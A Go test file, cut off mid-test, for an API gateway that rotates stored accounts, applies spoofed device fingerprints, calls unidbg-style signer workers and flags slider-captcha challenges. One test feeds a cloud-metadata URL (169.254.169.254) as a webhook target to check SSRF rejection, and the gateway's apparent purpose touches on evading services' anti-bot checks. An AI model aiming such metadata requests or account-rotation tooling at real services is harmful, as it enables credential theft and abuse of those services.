package gateway

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"testing"
	"time"
)

// TestHelperWorkerProcess is NOT a real unit test: when invoked as a child
// subprocess with CAP_TEST_WORKER_HELPER=1, it runs a lightweight loopback HTTP
// signer worker serving /health and /sign on 127.0.0.1:$CAP_RE_HTTP_PORT.
func TestHelperWorkerProcess(t *testing.T) {
	if os.Getenv("CAP_TEST_WORKER_HELPER") != "1" {
		return
	}
	port := strings.TrimSpace(os.Getenv("CAP_RE_HTTP_PORT"))
	if port == "" {
		port = strings.TrimSpace(os.Getenv("PORT"))
	}
	workerID := os.Getenv("CAP_WORKER_ID")
	workerIdx := os.Getenv("CAP_WORKER_INDEX")

	fmt.Fprintf(os.Stderr, "worker helper booting id=%s idx=%s port=%s pid=%d\n", workerID, workerIdx, port, os.Getpid())

	mux := http.NewServeMux()
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok":    true,
			"port":  port,
			"index": workerIdx,
			"pid":   os.Getpid(),
		})
	})
	mux.HandleFunc("/sign", func(w http.ResponseWriter, r *http.Request) {
		var in SignerInput
		_ = json.NewDecoder(r.Body).Decode(&in)
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"sign": fmt.Sprintf("sig-w%s-p%s-%s", workerIdx, port, in.Method),
			"headers": map[string]string{
				"X-Worker-Port":  port,
				"X-Worker-Index": workerIdx,
			},
		})
	})

	ln, err := net.Listen("tcp", "127.0.0.1:"+port)
	if err != nil {
		fmt.Fprintf(os.Stderr, "listen failed on 127.0.0.1:%s: %v\n", port, err)
		os.Exit(2)
	}
	srv := &http.Server{Handler: mux}
	if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
		fmt.Fprintf(os.Stderr, "serve failed: %v\n", err)
		os.Exit(3)
	}
	os.Exit(0)
}

func allocateConsecutiveFreePorts(t *testing.T, count int) int {
	t.Helper()
	for attempt := 0; attempt < 120; attempt++ {
		base := 34000 + attempt*10
		listeners := make([]net.Listener, 0, count)
		ok := true
		for i := 0; i < count; i++ {
			ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", base+i))
			if err != nil {
				ok = false
				break
			}
			listeners = append(listeners, ln)
		}
		for _, ln := range listeners {
			_ = ln.Close()
		}
		if ok {
			return base
		}
	}
	t.Fatalf("failed to allocate %d consecutive free loopback ports", count)
	return 0
}

func TestAccountPoolCRUDRotationStickyTemplatesAndHeaderPrecedence(t *testing.T) {
	capDir := t.TempDir()
	mgr, err := NewManager(capDir)
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	defer func() { _ = mgr.Shutdown() }()

	// 1. AccountPool CRUD + 0600 persistence + expiry filtering
	if err := mgr.UpdateAccountConfig(AccountPoolConfig{Strategy: StrategyRoundRobin}); err != nil {
		t.Fatalf("UpdateAccountConfig: %v", err)
	}

	accA, err := mgr.SaveAccount(AccountProfile{
		ID:          "acc-a",
		Name:        "Alpha User",
		Username:    "alpha",
		Token:       "tok-alpha-secret",
		Cookie:      "sid=alpha-cookie; theme=dark",
		AuthHeaders: map[string]string{"X-Account-Hdr": "from-acc-a", "X-Layer": "account"},
		Tokens:      map[string]string{"csrf": "csrf-a-123"},
		Tags:        []string{"vip", "cn"},
		Enabled:     true,
		Status:      AccountStatusActive,
		ExpiresAt:   time.Now().UTC().Add(2 * time.Hour).Format(time.RFC3339),
	})
	if err != nil {
		t.Fatalf("SaveAccount acc-a: %v", err)
	}
	accB, err := mgr.SaveAccount(AccountProfile{
		ID:             "acc-b",
		Name:           "Beta User",
		Username:       "beta",
		Token:          "tok-beta-secret",
		Cookies:        map[string]string{"sid": "beta-cookie"},
		Tags:           []string{"vip", "cn"},
		StickyDeviceID: "dev-sticky-1",
		Enabled:        true,
		Status:         AccountStatusActive,
	})
	if err != nil {
		t.Fatalf("SaveAccount acc-b: %v", err)
	}
	// Expired account must be excluded by default Acquire
	if _, err := mgr.SaveAccount(AccountProfile{
		ID:        "acc-expired",
		Name:      "Expired User",
		Username:  "old",
		Token:     "tok-old",
		Tags:      []string{"vip", "cn"},
		Enabled:   true,
		Status:    AccountStatusActive,
		ExpiresAt: time.Now().UTC().Add(-10 * time.Minute).Format(time.RFC3339),
	}); err != nil {
		t.Fatalf("SaveAccount acc-expired: %v", err)
	}

	// Verify accounts.json exists with 0600 permissions on Unix
	accFile := filepath.Join(mgr.Dir(), fileAccounts)
	fi, err := os.Stat(accFile)
	if err != nil {
		t.Fatalf("stat accounts.json: %v", err)
	}
	if runtime.GOOS != "windows" && fi.Mode().Perm() != 0o600 {
		t.Fatalf("accounts.json mode = %o, want 0600", fi.Mode().Perm())
	}

	total, active := mgr.AccountPool().Counts()
	if total != 3 || active != 2 {
		t.Fatalf("AccountPool.Counts() = (%d, %d), want (3, 2)", total, active)
	}

	// Round-robin rotation across active vip accounts (acc-a, acc-b)
	seenRR := make([]string, 0, 4)
	for range 4 {
		a, err := mgr.AccountPool().Acquire(AccountSelectOptions{Tags: []string{"vip"}})
		if err != nil {
			t.Fatalf("Acquire RR: %v", err)
		}
		if a.ID == "acc-expired" {
			t.Fatalf("expired account should not be selected")
		}
		seenRR = append(seenRR, a.ID)
	}
	if seenRR[0] != accA.ID || seenRR[1] != accB.ID || seenRR[2] != accA.ID || seenRR[3] != accB.ID {
		t.Fatalf("round_robin sequence = %v, want [acc-a acc-b acc-a acc-b]", seenRR)
	}

	// Least-used strategy: bump acc-a once so acc-b has fewer uses
	_, _ = mgr.AccountPool().Acquire(AccountSelectOptions{ExplicitID: accA.ID})
	lu, err := mgr.AccountPool().Acquire(AccountSelectOptions{Tags: []string{"vip"}, Strategy: StrategyLeastUsed})
	if err != nil {
		t.Fatalf("Acquire least_used: %v", err)
	}
	if lu.ID != accB.ID {
		t.Fatalf("least_used picked %s, want %s", lu.ID, accB.ID)
	}

	// Sticky-device strategy
	sticky, err := mgr.AccountPool().Acquire(AccountSelectOptions{
		Tags:     []string{"vip"},
		DeviceID: "dev-sticky-1",
		Strategy: StrategyStickyDevice,
	})
	if err != nil {
		t.Fatalf("Acquire sticky_device: %v", err)
	}
	if sticky.ID != accB.ID {
		t.Fatalf("sticky_device picked %s, want %s", sticky.ID, accB.ID)
	}

	// MarkExpired redacts account secrets in LastError, and MarkHealthy restores active
	if err := mgr.AccountPool().MarkExpired(accA.ID, "401 token tok-alpha-secret rejected"); err != nil {
		t.Fatalf("MarkExpired: %v", err)
	}
	gotA, _ := mgr.GetAccount(accA.ID)
	if gotA.Status != AccountStatusExpired || strings.Contains(gotA.LastError, "tok-alpha-secret") {
		t.Fatalf("expected expired status with redacted secret, got status=%s err=%q", gotA.Status, gotA.LastError)
	}
	if err := mgr.AccountPool().MarkHealthy(accA.ID); err != nil {
		t.Fatalf("MarkHealthy: %v", err)
	}

	// Verify disk reload round-trip
	reloaded, err := NewManager(capDir)
	if err != nil {
		t.Fatalf("NewManager reload: %v", err)
	}
	defer func() { _ = reloaded.Shutdown() }()
	if len(reloaded.ListAccounts()) != 3 {
		t.Fatalf("reloaded account count = %d, want 3", len(reloaded.ListAccounts()))
	}

	// 2. End-to-end template expansion & case-insensitive header override precedence:
	//    static route headers -> device headers -> account headers -> dynamic request -> signer headers
	var capturedHeaders http.Header
	var capturedQuery string
	var capturedBody string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		capturedHeaders = r.Header.Clone()
		capturedQuery = r.URL.RawQuery
		b, _ := io.ReadAll(r.Body)
		capturedBody = string(b)
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"ok":true}`))
	}))
	defer upstream.Close()

	dev, err := mgr.SaveDevice(DeviceProfile{
		ID:      "dev-layer-1",
		Name:    "Layer Device",
		Kind:    DeviceKindVirtual,
		Enabled: true,
		Fingerprint: DeviceFingerprint{
			Model:     "Pixel 8",
			Brand:     "Google",
			UserAgent: "DeviceUA/1.0",
			ExtraHeaders: map[string]string{
				"X-Static-Vs-Device": "from-device",
				"x-layer":            "device",
			},
		},
		Cookies: map[string]string{"sid": "device-cookie"},
	})
	if err != nil {
		t.Fatalf("SaveDevice: %v", err)
	}

	signer, err := mgr.SaveSigner(SignerProvider{
		Name:          "Layer Signer",
		Kind:          SignerKindBuiltinHMAC,
		Enabled:       true,
		HMACAlgorithm: "hmac-sha256",
		HMACSecret:    "s3cr3t",
		InjectTarget:  InjectTargetHeader,
		InjectField:   "X-Signed-Layer",
		OutputMapping: map[string]string{"sign": "header:X-Signed-Layer"},
	})
	if err != nil {
		t.Fatalf("SaveSigner: %v", err)
	}

	_, err = mgr.SaveRoute(ServiceRoute{
		Slug:           "account-precedence",
		Name:           "Account Precedence",
		Enabled:        true,
		UpstreamMethod: "POST",
		UpstreamURL:    upstream.URL + "/profile?user={{account.username}}&csrf={{account.token.csrf}}",
		StaticHeaders: map[string]string{
			"X-Static-Only":      "from-static",
			"x-static-vs-device": "from-static",
			"X-Layer":            "static",
			"X-Tpl-Token":        "{{account.token}}",
			"X-Tpl-Cookie":       "{{account.cookie}}",
			"X-Tpl-Acc-Hdr":      "{{account.header.X-Account-Hdr}}",
			"X-Req-Override":     "from-static",
		},
		BodyTemplate:   `{"u":"{{account.username}}","tok":"{{account.token}}"}`,
		SignerID:       signer.ID,
		RequireDevice:  true,
		RequireAccount: true,
	})
	if err != nil {
		t.Fatalf("SaveRoute: %v", err)
	}

	res, err := mgr.InvokeRoute(context.Background(), "account-precedence", TestInvokeRequest{
		DeviceID:  dev.ID,
		AccountID: accA.ID,
		Headers: map[string]string{
			"x-req-override": "from-request",
			"x-signed-layer": "from-request-should-be-overridden",
		},
	})
	if err != nil || !res.OK {
		t.Fatalf("InvokeRoute account-precedence failed: err=%v res=%+v", err, res)
	}

	if capturedHeaders.Get("X-Static-Only") != "from-static" {
		t.Fatalf("X-Static-Only = %q", capturedHeaders.Get("X-Static-Only"))
	}
	if capturedHeaders.Get("X-Static-Vs-Device") != "from-device" {
		t.Fatalf("expected device header to override static header, got %q", capturedHeaders.Get("X-Static-Vs-Device"))
	}
	if capturedHeaders.Get("X-Layer") != "account" {
		t.Fatalf("expected account header to override device+static header, got %q", capturedHeaders.Get("X-Layer"))
	}
	if capturedHeaders.Get("Cookie") != "sid=alpha-cookie; theme=dark" {
		t.Fatalf("expected account cookie to override device cookie, got %q", capturedHeaders.Get("Cookie"))
	}
	if capturedHeaders.Get("Authorization") != "Bearer tok-alpha-secret" {
		t.Fatalf("expected automatic Bearer token header, got %q", capturedHeaders.Get("Authorization"))
	}
	if capturedHeaders.Get("X-Req-Override") != "from-request" {
		t.Fatalf("expected dynamic request header to override static/account, got %q", capturedHeaders.Get("X-Req-Override"))
	}
	if gotSig := capturedHeaders.Get("X-Signed-Layer"); gotSig == "" || gotSig == "from-request-should-be-overridden" {
		t.Fatalf("expected signer header to override request header, got %q", gotSig)
	}
	if capturedHeaders.Get("X-Tpl-Token") != "tok-alpha-secret" ||
		capturedHeaders.Get("X-Tpl-Cookie") != "sid=alpha-cookie; theme=dark" ||
		capturedHeaders.Get("X-Tpl-Acc-Hdr") != "from-acc-a" {
		t.Fatalf("account template headers mismatch: tok=%q cookie=%q hdr=%q",
			capturedHeaders.Get("X-Tpl-Token"),
			capturedHeaders.Get("X-Tpl-Cookie"),
			capturedHeaders.Get("X-Tpl-Acc-Hdr"))
	}
	if !strings.Contains(capturedQuery, "user=alpha") || !strings.Contains(capturedQuery, "csrf=csrf-a-123") {
		t.Fatalf("unexpected rendered query: %q", capturedQuery)
	}
	if !strings.Contains(capturedBody, `"u":"alpha"`) || !strings.Contains(capturedBody, `"tok":"tok-alpha-secret"`) {
		t.Fatalf("unexpected rendered body: %q", capturedBody)
	}
}

func TestAccountSingleflightAutoRefreshBodyMatchRecursionGuardAndChallengeWebhook(t *testing.T) {
	mgr, err := NewManager(t.TempDir())
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	defer func() { _ = mgr.Shutdown() }()

	const (
		oldToken   = "expired-token-v1-secret"
		freshToken = "fresh-token-v2-secret"
	)

	var refreshCalls atomic.Int32
	var upstreamUnauthorized atomic.Int32
	var upstreamAuthorized atomic.Int32

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/orders":
			if r.Header.Get("Authorization") != "Bearer "+freshToken {
				upstreamUnauthorized.Add(1)
				w.WriteHeader(http.StatusUnauthorized)
				_, _ = w.Write([]byte(`{"error":"session expired"}`))
				return
			}
			upstreamAuthorized.Add(1)
			w.Header().Set("Content-Type", "application/json")
			_ = json.NewEncoder(w).Encode(map[string]any{
				"ok":     true,
				"cookie": r.Header.Get("Cookie"),
				"token":  r.Header.Get("Authorization"),
			})
		case "/auth/refresh":
			refreshCalls.Add(1)
			// Hold briefly so all 10 concurrent 401 requests overlap in singleflight.
			time.Sleep(40 * time.Millisecond)
			w.Header().Set("Content-Type", "application/json")
			_ = json.NewEncoder(w).Encode(map[string]any{
				"access_token": freshToken,
				"cookie":       "sid=fresh-session-99",
				"expires_in":   3600,
			})
		case "/api/body-expired":
			if r.Header.Get("Authorization") != "Bearer fresh-body-tok" {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusOK)
				_, _ = w.Write([]byte(`{"code":100401,"msg":"token_expired_body"}`))
				return
			}
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(`{"code":0,"data":"ok-after-body-refresh"}`))
		case "/auth/refresh-body":
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(`{"token":"fresh-body-tok"}`))
		case "/api/challenge":
			w.WriteHeader(http.StatusForbidden)
			_, _ = w.Write([]byte(`{"error":"captcha_required","detail":"token ` + oldToken + ` blocked by slider captcha"}`))
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer upstream.Close()

	// Challenge alert webhook receiver
	webhookCh := make(chan map[string]any, 4)
	webhookSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var payload map[string]any
		_ = json.NewDecoder(r.Body).Decode(&payload)
		webhookCh <- payload
		w.WriteHeader(http.StatusOK)
	}))
	defer webhookSrv.Close()

	acc, err := mgr.SaveAccount(AccountProfile{
		ID:           "acc-sf-1",
		Name:         "Singleflight User",
		Username:     "sfuser",
		Token:        oldToken,
		RefreshToken: "rt-12345",
		Enabled:      true,
		Status:       AccountStatusActive,
	})
	if err != nil {
		t.Fatalf("SaveAccount: %v", err)
	}

	if _, err := mgr.SaveRoute(ServiceRoute{
		Slug:           "auth-refresh",
		Name:           "Refresh Session",
		Enabled:        true,
		UpstreamMethod: "POST",
		UpstreamURL:    upstream.URL + "/auth/refresh",
		BodyTemplate:   `{"refresh_token":"{{account.refresh_token}}"}`,
		AutoRefresh:    true,
		// Deliberately set self/cycle to confirm recursion guard prevents infinite loops.
		RefreshRouteSlug: "auth-refresh",
	}); err != nil {
		t.Fatalf("SaveRoute auth-refresh: %v", err)
	}

	if _, err := mgr.SaveRoute(ServiceRoute{
		Slug:              "orders-api",
		Name:              "Orders API",
		Enabled:           true,
		UpstreamMethod:    "GET",
		UpstreamURL:       upstream.URL + "/api/orders",
		RequireAccount:    true,
		AutoRefresh:       true,
		RefreshRouteSlug:  "auth-refresh",
		RefreshOnStatuses: []int{401, 403},
	}); err != nil {
		t.Fatalf("SaveRoute orders-api: %v", err)
	}

	// Launch 10 concurrent calls sharing ONE expired account.
	const concurrency = 10
	var wg sync.WaitGroup
	errs := make(chan error, concurrency)
	results := make(chan *TestInvokeResult, concurrency)
	startGate := make(chan struct{})

	for range concurrency {
		wg.Add(1)
		go func() {
			defer wg.Done()
			<-startGate
			res, invErr := mgr.InvokeRoute(context.Background(), "orders-api", TestInvokeRequest{
				AccountID: acc.ID,
			})
			if invErr != nil {
				errs <- invErr
				return
			}
			results <- res
		}()
	}
	close(startGate)
	wg.Wait()
	close(errs)
	close(results)

	for invErr := range errs {
		t.Fatalf("concurrent InvokeRoute failed: %v", invErr)
	}
	if got := refreshCalls.Load(); got != 1 {
		t.Fatalf("refresh route called %d times for %d concurrent 401s, want EXACTLY 1", got, concurrency)
	}
	if got := upstreamAuthorized.Load(); got != concurrency {
		t.Fatalf("authorized upstream calls = %d, want %d", got, concurrency)
	}
	for res := range results {
		if !res.OK || res.Status != http.StatusOK {
			t.Fatalf("expected 200 OK after refresh retry, got %+v", res)
		}
		if !res.RefreshTriggered {
			t.Fatalf("expected RefreshTriggered=true on retried result, got %+v", res)
		}
		dm, _ := res.Data.(map[string]any)
		if dm["cookie"] != "sid=fresh-session-99" {
			t.Fatalf("expected refreshed cookie on retry, got %+v", dm)
		}
	}

	updatedAcc, ok := mgr.GetAccount(acc.ID)
	if !ok || updatedAcc.Token != freshToken || updatedAcc.RefreshCount != 1 || updatedAcc.ExpiresAt == "" {
		t.Fatalf("unexpected persisted account after refresh: %+v", updatedAcc)
	}

	// Test body-substring refresh trigger (HTTP 200 with "token_expired_body")
	bodyAcc, _ := mgr.SaveAccount(AccountProfile{
		ID:      "acc-body-1",
		Name:    "Body Refresh User",
		Token:   "stale-body-tok",
		Enabled: true,
		Status:  AccountStatusActive,
	})
	_, _ = mgr.SaveRoute(ServiceRoute{
		Slug:           "refresh-body",
		Name:           "Refresh Body",
		Enabled:        true,
		UpstreamMethod: "POST",
		UpstreamURL:    upstream.URL + "/auth/refresh-body",
	})
	_, _ = mgr.SaveRoute(ServiceRoute{
		Slug:                "body-api",
		Name:                "Body Match API",
		Enabled:             true,
		UpstreamMethod:      "GET",
		UpstreamURL:         upstream.URL + "/api/body-expired",
		RequireAccount:      true,
		AutoRefresh:         true,
		RefreshRouteSlug:    "refresh-body",
		RefreshOnBodySubstr: "token_expired_body",
	})
	bodyRes, err := mgr.InvokeRoute(context.Background(), "body-api", TestInvokeRequest{AccountID: bodyAcc.ID})
	if err != nil || !bodyRes.OK || !bodyRes.RefreshTriggered || !strings.Contains(bodyRes.Body, "ok-after-body-refresh") {
		t.Fatalf("body-substr auto-refresh failed: err=%v res=%+v", err, bodyRes)
	}

	// Test challenge webhook alerting + secret redaction + SSRF rejection
	if _, err := mgr.SaveRoute(ServiceRoute{
		Slug:                "bad-webhook",
		Name:                "Bad Webhook",
		Enabled:             true,
		UpstreamMethod:      "GET",
		UpstreamURL:         upstream.URL + "/api/challenge",
		ChallengeWebhookURL: "http://169.254.169.254/latest/meta-data",
	}); err == nil {
		t.Fatalf("expected metadata IP challenge_webhook_url to be rejected")
	}

	chAcc, _ := mgr.SaveAccount(AccountProfile{
		ID:      "acc-challenge-1",
		Name:    "Challenged User",
		Token:   oldToken,
		Enabled: true,
		Status:  AccountStatusActive,
	})
	_, err = mgr.SaveRoute(ServiceRoute{
		Slug:                "challenge-api",
		Name:                "Challenge API",
		Enabled:             true,
		UpstreamMethod:      "GET",
		UpstreamURL:         upstream.URL + "/api/challenge",
		RequireAccount:      true,
		ChallengeWebhookURL: webhookSrv.URL + "/alert",
	})
	if err != nil {
		t.Fatalf("SaveRoute challenge-api: %v", err)
	}
	chRes, err := mgr.InvokeRoute(context.Background(), "challenge-api", TestInvokeRequest{AccountID: chAcc.ID})
	if err != nil || chRes.Status != http.StatusForbidden {
		t.Fatalf("challenge invoke unexpected: err=%v res=%+v", err, chRes)
	}

	select {
	case payload := <-webhookCh:
		if payload["event"] != "gateway.challenge_detected" || payload["route_slug"] != "challenge-api" {
			t.Fatalf("unexpected challenge webhook payload: %+v", payload)
		}
		rawBytes, _ := json.Marshal(payload)
		if strings.Contains(string(rawBytes), oldToken) {
			t.Fatalf("account secret leaked in challenge webhook payload: %s", string(rawBytes))
		}
	case <-time.After(3 * time.Second):
		t.Fatalf("timed out waiting for async challenge webhook notification")
	}

	afterChAcc, _ := mgr.GetAccount(chAcc.ID)
	if afterChAcc.Status != AccountStatusChallenged {
		t.Fatalf("expected account status=challenged, got %q", afterChAcc.Status)
	}
}

func TestManagedWorkerPoolHealthRoundRobinRestartSignerAndNoOrphans(t *testing.T) {
	capDir := t.TempDir()
	mgr, err := NewManager(capDir)
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	mgr.WorkerPool().SetProbeInterval(80 * time.Millisecond)

	basePort := allocateConsecutiveFreePorts(t, 2)
	spec, err := mgr.SaveWorker(ManagedWorkerSpec{
		ID:               "wp-test-signer",
		Name:             "Test HTTP Signer Workers",
		Kind:             WorkerKindUnidbgHTTP,
		Command:          os.Args[0],
		Args:             []string{"-test.run=^TestHelperWorkerProcess$"},
		Env:              map[string]string{"CAP_TEST_WORKER_HELPER": "1"},
		BasePort:         basePort,
		Instances:        2,
		HealthPath:       "/health",
		SignPath:         "/sign",
		AutoRestart:      true,
		MaxRestarts:      3,
		RestartBackoffMs: 50,
		Enabled:          true,
	})
	if err != nil {
		t.Fatalf("SaveWorker: %v", err)
	}

	// Verify workers.json persistence reload
	reloaded, err := NewManager(capDir)
	if err != nil {
		t.Fatalf("NewManager reload: %v", err)
	}
	if _, ok := reloaded.GetWorker(spec.ID); !ok {
		t.Fatalf("expected worker spec persisted in workers.json")
	}
	_ = reloaded.Shutdown()

	if err := mgr.StartWorker(spec.ID); err != nil {
		t.Fatalf("StartWorker: %v", err)
	}

	waitHealthy := func(wantHealthy int, timeout time.Duration) ManagedWorkerStatus {
		t.Helper()
		deadline := time.Now().Add(timeout)
		for time.Now().Before(deadline) {
			for _, st := range mgr.ListWorkerStatuses() {
				if st.Spec.ID == spec.ID && st.HealthyInstances == wantHealthy {
					return st
				}
			}
			time.Sleep(30 * time.Millisecond)
		}
		t.Fatalf("timed out waiting for %d healthy instances, current statuses: %+v", wantHealthy, mgr.ListWorkerStatuses())
		return ManagedWorkerStatus{}
	}

	st := waitHealthy(2, 5*time.Second)
	if !st.Running || len(st.Instances) != 2 {
		t.Fatalf("unexpected worker status: %+v", st)
	}
	for i, inst := range st.Instances {
		if !inst.Running || !inst.Healthy || inst.PID <= 0 {
			t.Fatalf("instance %d not healthy/running: %+v", i, inst)
		}
		if !strings.Contains(inst.StderrTail, "worker helper booting") {
			t.Fatalf("instance %d missing expected stderr tail: %q", i, inst.StderrTail)
		}
	}

	stats := mgr.Stats()
	if stats.TotalWorkers != 2 || stats.HealthyWorkers != 2 {
		t.Fatalf("Stats worker counts = (%d, %d), want (2, 2)", stats.TotalWorkers, stats.HealthyWorkers)
	}

	// Verify round-robin endpoint selection across both ports
	ep1, err := mgr.WorkerPool().PickHealthyEndpoint(spec.ID)
	if err != nil {
		t.Fatalf("PickHealthyEndpoint #1: %v", err)
	}
	ep2, err := mgr.WorkerPool().PickHealthyEndpoint(spec.ID)
	if err != nil {
		t.Fatalf("PickHealthyEndpoint #2: %v", err)
	}
	ep3, err := mgr.WorkerPool().PickHealthyEndpoint(spec.ID)
	if err != nil {
		t.Fatalf("PickHealthyEndpoint #3: %v", err)
	}
	wantPort0 := fmt.Sprintf("http://127.0.0.1:%d/sign", basePort)
	wantPort1 := fmt.Sprintf("http://127.0.0.1:%d/sign", basePort+1)
	if ep1 == ep2 || ep1 != ep3 || (ep1 != wantPort0 && ep1 != wantPort1) {
		t.Fatalf("expected round-robin across [%s, %s], got [%s, %s, %s]", wantPort0, wantPort1, ep1, ep2, ep3)
	}

	// Wire SignerProvider with WorkerPoolID (no static EndpointURL!) into a ServiceRoute
	signer, err := mgr.SaveSigner(SignerProvider{
		Name:         "Managed Pool Signer",
		Kind:         SignerKindUnidbgHTTP,
		Enabled:      true,
		WorkerPoolID: spec.ID,
		InjectTarget: InjectTargetHeader,
		InjectField:  "X-Pool-Sig",
	})
	if err != nil {
		t.Fatalf("SaveSigner with WorkerPoolID: %v", err)
	}

	seenWorkerPorts := make(map[string]int)
	var seenMu sync.Mutex
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seenMu.Lock()
		seenWorkerPorts[r.Header.Get("X-Worker-Port")]++
		seenMu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{
			"sig":         r.Header.Get("X-Pool-Sig"),
			"worker_port": r.Header.Get("X-Worker-Port"),
		})
	}))
	defer upstream.Close()

	_, err = mgr.SaveRoute(ServiceRoute{
		Slug:           "signed-by-pool",
		Name:           "Signed By Pool",
		Enabled:        true,
		UpstreamMethod: "GET",
		UpstreamURL:    upstream.URL + "/data",
		SignerID:       signer.ID,
	})
	if err != nil {
		t.Fatalf("SaveRoute signed-by-pool: %v", err)
	}

	for range 4 {
		res, invErr := mgr.InvokeRoute(context.Background(), "signed-by-pool", TestInvokeRequest{})
		if invErr != nil || !res.OK {
			t.Fatalf("InvokeRoute signed-by-pool: err=%v res=%+v", invErr, res)
		}
	}
	seenMu.Lock()
	p0Hits := seenWorkerPorts[fmt.Sprintf("%d", basePort)]
	p1Hits := seenWorkerPorts[fmt.Sprintf("%d", basePort+1)]
	seenMu.Unlock()
	if p0Hits != 2 || p1Hits != 2 {
		t.Fatalf("expected balanced hits across both worker ports (2, 2), got (%d, %d)", p0Hits, p1Hits)
	}

	// Crash instance 0 via SIGKILL and verify auto-restart with new PID & Restarts >= 1
	origPID0 := st.Instances[0].PID
	if err := syscall.Kill(origPID0, syscall.SIGKILL); err != nil {
		t.Fatalf("SIGKILL instance 0 (pid %d): %v", origPID0, err)
	}

	deadline := time.Now().Add(5 * time.Second)
	var recoveredPID0 int
	for time.Now().Before(deadline) {
		for _, cur := range mgr.ListWorkerStatuses() {
			if cur.Spec.ID == spec.ID && len(cur.Instances) == 2 {
				inst0 := cur.Instances[0]
				if inst0.Running && inst0.Healthy && inst0.PID > 0 && inst0.PID != origPID0 && inst0.Restarts >= 1 {
					recoveredPID0 = inst0.PID
					break
				}
			}
		}
		if recoveredPID0 > 0 {
			break
		}
		time.Sleep(40 * time.Millisecond)
	}
	if recoveredPID0 == 0 {
		t.Fatalf("instance 0 did not auto-restart and recover healthy: %+v", mgr.ListWorkerStatuses())
	}

	// Record all live PIDs before Shutdown and assert ZERO orphan PIDs survive
	livePIDs := []int{}
	for _, cur := range mgr.ListWorkerStatuses() {
		for _, inst := range cur.Instances {
			if inst.PID > 0 {
				livePIDs = append(livePIDs, inst.PID)
			}
		}
	}
	if len(livePIDs) != 2 {
		t.Fatalf("expected 2 live worker PIDs before shutdown, got %v", livePIDs)
	}

	if err := mgr.Shutdown(); err != nil {
		t.Fatalf("Manager.Shutdown: %v", err)
	}

	if runtime.GOOS != "windows" {
		for _, pid := range livePIDs {
			err := syscall.Kill(pid, 0)
			if err == nil {
				t.Fatalf("orphan worker PID %d is still alive after Shutdown()", pid)
			}
		}
	}
}

func TestRouteCacheHitMissLRUEvictionExpiryAndNoCacheBypass(t *testing.T) {
	mgr, err := NewManager(t.TempDir())
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	defer func() { _ = mgr.Shutdown() }()

	// Inject controllable clock into RouteCache for deterministic TTL expiry verification.
	var clockMu sync.Mutex
	curTime := time.Date(2026, 11, 25, 12, 0, 0, 0, time.UTC)
	mgr.cache.now = func() time.Time {
		clockMu.Lock()
		defer clockMu.Unlock()
		return curTime
	}
	advanceTime := func(d time.Duration) {
		clockMu.Lock()
		curTime = curTime.Add(d)
		clockMu.Unlock()
	}

	var upstreamHits atomic.Int32
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hit := upstreamHits.Add(1)
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"id":  r.URL.Query().Get("id"),
			"hit": hit,
		})
	}))
	defer upstream.Close()

	_, err = mgr.SaveRoute(ServiceRoute{
		Slug:            "cached-items",
		Name:            "Cached Items",
		Enabled:         true,
		UpstreamMethod:  "GET",
		UpstreamURL:     upstream.URL + "/items?id={{input.id}}",
		CacheTTLSec:     10,
		CacheKeyFields:  []string{"id"},
		CacheMaxEntries: 2,
	})
	if err != nil {
		t.Fatalf("SaveRoute: %v", err)
	}

	gwSrv := httptest.NewServer(mgr.Handler())
	defer gwSrv.Close()

	callGW := func(query string, noCache bool) (cacheHdr string, res TestInvokeResult) {
		t.Helper()
		req, _ := http.NewRequest(http.MethodGet, gwSrv.URL+"/gw/cached-items?"+query, nil)
		if noCache {
			req.Header.Set("Cache-Control", "no-cache")
		}
		resp, err := gwSrv.Client().Do(req)
		if err != nil {
			t.Fatalf("GET /gw/cached-items?%s: %v", query, err)
		}
		defer resp.Body.Close()
		cacheHdr = resp.Header.Get("X-Cap-Cache")
		_ = json.NewDecoder(resp.Body).Decode(&res)
		return cacheHdr, res
	}

	// 1. First request for id=1 -> MISS
	hdr, res := callGW("id=1&extra=a", false)
	if hdr != "MISS" || res.CacheHit || upstreamHits.Load() != 1 {
		t.Fatalf("expected MISS on first request: hdr=%q hit=%v upstreamHits=%d", hdr, res.CacheHit, upstreamHits.Load())
	}

	// 2. Second request for id=1 (even with different ignored query param extra=b) -> HIT
	hdr, res = callGW("id=1&extra=b", false)
	if hdr != "HIT" || !res.CacheHit || upstreamHits.Load() != 1 {
		t.Fatalf("expected HIT on cached key: hdr=%q hit=%v upstreamHits=%d", hdr, res.CacheHit, upstreamHits.Load())
	}

	// 3. Cache-Control: no-cache bypasses cache and re-fetches from upstream
	hdr, res = callGW("id=1", true)
